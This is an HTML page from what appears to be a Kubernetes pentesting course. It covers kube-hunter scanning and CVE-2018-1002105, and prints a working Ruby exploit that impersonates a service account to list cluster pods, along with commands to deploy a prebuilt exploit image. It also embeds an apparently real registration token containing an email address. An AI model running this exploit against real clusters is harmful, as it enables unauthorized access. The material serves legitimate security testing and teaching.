@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Vulnerability</title>
+
+    <!-- Bootstrap -->
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+    <link href="styles.css" rel="stylesheet">
+    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    <!-- Include all compiled plugins (below), or include individual files as needed -->
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <script src="antixss.js" type="text/javascript"></script>
+
+  
+
+</head>
+
+<body>
+    <div class="container" id="container">
+		<h1>Discovering the Vulnerability</h1>
+		<div id='kube-vuln'>
+			<p>
+                <em>The commands on this page can be run in a terminal or command prompt</em>
+            </p>
+            <p>
+				There are several tools available for penetration testers carrying out a security test of Kubernetes clusters. The one we are going to concentrate on in this section is <strong>kube-hunter</strong> available from <a href="https://github.com/aquasecurity/kube-hunter" target="_blank">Aqua Security</a> There are several options to run kube-hunter, it can be run as a container inside the cluster, as a python script or you can visit the <a href="https://kube-hunter.aquasec.com/" target="_blank">website</a> and register for a token and run it with docker as described here.<br/>
+                Once you have registered with an email address you will get a command to run similar to: <br/>
+                 <em>docker run -it --rm --network host aquasec/kube-hunter --token eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aW1lIjoxNTUyN
+jUwNjg2LjQ2NTc1MDIsImVtYWlsIjoicG93ZXJqb2huNjRAZ21haWwuY29tIiwiciI6ImZkNmUyNTQ3In0.L-SDU7AKoF4Gw9zoSudwYte_s_z-3oG4okML
+w9gQG1o</em><br/>
+                You will then be presented with several options: <br/>
+                <ol>
+                    <li>Remote scanning      (scans one or more specific IPs or DNS names)</li>
+                    <li>Subnet scanning      (scans subnets on all local network interfaces)</li>
+                    <li>IP range scanning    (scans a given IP range)</li>
+                </ol>
+                Choose option 1 Remote Scanning and enter the ip address of the cluster. To get the cluster IP run:<br/>
+                <em>kubectl cluster-info</em><br/>
+                In our sample case the ip is 172.42.42.100
+                A table of vulnerabilities is then presented:<br/>
+                <img src="images/vuln.png" width='50%' height='50%' id='vulnImg'/><br/>
+                Amongst the results we can see it has been reported that the cluster is vulnerable to CVE-2018-1002105. 
+                <h3>DESCRIPTION OF CVE-2018-1002015</h3>
+                 This vulnerabilty affected the <strong>API-Server</strong> and took advantage of a weakness - Once a legitimate authorized request was made to the API server the API Server did not check error messages in sequenced requests which allowed bypassing of the authorization logic. Specifically, when a HTTP request contained a HTTP upgrade header, the request was successful whether or not the response cotained the successful switching protocol <strong>101</strong> response. For a more detailed description consult this excellent blog post by <a href="https://www.twistlock.com/labs-blog/demystifying-kubernetes-cve-2018-1002105-dead-simple-exploit/" target="_blank"> Arial Zelivansky</a> of Twistlock.
+                The two escalation paths are:<br/>
+                <ul>
+                    <li>Through api-server calls made to any aggregated API server endpoints which could be exercised through discovery api calls which are by default permitted to anonymous users.</li>
+                    <li>Through the API server to kubelets - through pods exec/attach/port-forward API’s these are not permitted to anonymous users by default</li>
+                </ul>
+                Kubernetes has patched versions:
+                <ul>
+                <li> v1.10.11</li>
+                <li> v.1.11.5</li>
+                <li> v1.12.3 </li>
+                <li> v1.13.0-rc.1</li>
+                </ul>
+                 Any versions below these are potentially vulnerable. All Kubernetes partners had been notified prior to the disclosure and had applied patches to their offerings. So as a tester it is important to prove the vulnerability really exists, as most providers may have patched unsupported versions.<br/>
+                There are now several POC's available online to demonstrate the explotation of this vulnerability, we are going to use the method available in the aforementioned <a href="https://www.twistlock.com/labs-blog/demystifying-kubernetes-cve-2018-1002105-dead-simple-exploit/" target="_blank">blog</a> This exploit targets the Aggregation API, the aggregation layer provides extensions to the Kubernetes API. One of those extensions is the metrics service, which can make discovery calls to all the pods in the cluster. The expoilt code developed by Arial Zelivansky targets the metrics service and uses the service account <em>system:serviceaccount:kube-system:horizontal-pod-autoscaler</em> which has a default ClusterRoleBinding which allows access to the metrics service. The <em>X-Remote-User</em> header allows impersonation of a user.
+            </p>
+            <p>
+                <code>#!/usr/bin/env ruby<br/>
+                        <br/>
+                        require 'socket'<br/>
+                        require 'openssl'<br/>
+                        require 'json'<br/>
+                        <br/>
+                        host = 'kubernetes'<br/>
+                        metrics = '/apis/metrics.k8s.io/v1beta1'<br/>
+                        <br/>
+                        sock = TCPSocket.new host, 443<br/>
+                        ssl = OpenSSL::SSL::SSLSocket.new sock<br/>
+                        ssl.sync_close = true<br/>
+                        ssl.connect<br/>
+                        <br/>
+                        ssl.puts "GET #{metrics} HTTP/1.1\r\nHost: #{host}\r\nUpgrade: WebSocket\r\nConnection: upgrade\r\n\r\n"<br/>
+                        6.times { puts ssl.gets }<br/>
+                        ssl.puts "GET #{metrics}/pods HTTP/1.1\r\nHost: #{host}\r\nX-Remote-User: system:serviceaccount:kube-system:horizontal-pod-autoscaler\r\n\r\n"<br/>
+                        6.times { puts ssl.gets }<br/>
+                        <br/>
+                        puts JSON.pretty_generate JSON.parse ssl.gets<br/>
+                        <br/>
+                        ssl.close<br/>
+                </code>
+            </p>
+            <p> The steps to use this exploit are: 
+                <ul>
+                    <li> Deploy a pod with an nginx image.</li>
+                    <li> Update and upgrade the operating system.</li>
+                    <li> Install git and ruby.</li>
+                    <li> Download the code from Github.</li>
+                    <li> Navigate to the git directory.</li>
+                    <li> Give execution permissions to the poc.rb file (chmod +x).</li>
+                    <li> Execute the file.</li>
+                </ul>
+             For convenience I have created an nginx image with all those steps pre-configured, running:<br/>
+             <em>kubectl create deployment nginxexploit --image=cavedweller/nginx-1002105:v1</em><br/>
+             <em>kubectl get pods</em><br/>
+             Copy the name of the nginxexpoit pod<br/>
+             <em>kubectl exec -it nginxexploit-xxxxxxxxx -- /bin/bash</em>(replace xxxxxxx with appropriate value)<br/>
+             <em>cd 2d09ec0ad600667980359394a2a65a0d/ </em> (Enter cd 2 and hit tab to auto-complete.) <br/>
+             <em> ./poc.rb </em><br/>
+             The result is information leakage and reveals all the pods in the cluster. Now that we have proved that the cluster is vulnerable to CVE-2018-1002105 the mitigation is to advise the client to upgrade the cluster to a patched version of Kubernetes.
+         </p>
+         <button type="button" class="btn btn-primary" id="checkpoint4">CHECKPOINT</button>
+		</div>
+	</div>
+     <script type="text/javascript">
+        $( document ).ready(function() {
+        $('#checkpoint4').on('click', function() {
+            $(location).attr('href', 'checkpoint4.html');
+            });
+    });
+    </script>
+</body>
+</html>
